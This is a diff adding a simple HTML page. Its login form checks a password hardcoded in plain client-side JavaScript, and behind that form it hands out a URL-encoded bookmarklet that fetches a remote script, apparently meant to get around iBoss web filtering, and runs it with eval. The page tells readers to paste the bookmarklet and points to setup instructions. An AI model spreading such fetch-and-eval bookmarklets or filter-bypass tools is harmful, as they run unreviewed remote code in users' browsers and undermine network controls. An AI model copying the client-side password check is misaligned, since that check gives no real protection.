@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>My Website</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+	<!-- Login form -->
+	<form id="login-form">
+		<label for="password">Password:</label>
+		<input type="password" id="password" name="password">
+		<button type="submit">Login</button>
+	</form>
+
+	<!-- Content for logged-in users -->
+	<div id="content" style="display:none">
+		<h1>Welcome to my website!</h1>
+		<p>Here is the code! Put this code into a bookmarklet: javascript:%28async%20function%28%29%7Beval%28await%28await%20fetch%28%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSpaceSaver%2FIngot-for-iBoss%40latest%2Fingot.js%22%29%29.text%28%29%29%7D%29%28%29%3B
+
+
+   (If you dont know how to make a bookmarklet copy and paste this link on google and it will lead you to a google doc with the instructions https://docs.google.com/document/d/1g_Fvt1wgfA0xu3ytNq_mhwVQZzN62T8m6C25TnyLByI/edit?usp=sharing) (btw dont copy the parenthesis for the link)</p>
+	</div>
+
+	<script>
+		// Define the correct password here
+		const correctPassword = "ducks4life";
+
+		// Get the login form and the content container
+		const loginForm = document.getElementById("login-form");
+		const content = document.getElementById("content");
+
+		// Add a submit event listener to the login form
+		loginForm.addEventListener("submit", event => {
+			// Prevent the default form submission behavior
+			event.preventDefault();
+
+			// Get the password entered by the user
+			const password = loginForm.elements.password.value;
+
+			// Check if the password is correct
+			if (password === correctPassword) {
+				// Display the content for logged-in users
+				content.style.display = "block";
+				// Hide the login form
+				loginForm.style.display = "none";
+			} else {
+				// Display an error message
+				alert("Incorrect password. Please try again.");
+			}
+		});
+	</script>
+</body>
+</html>
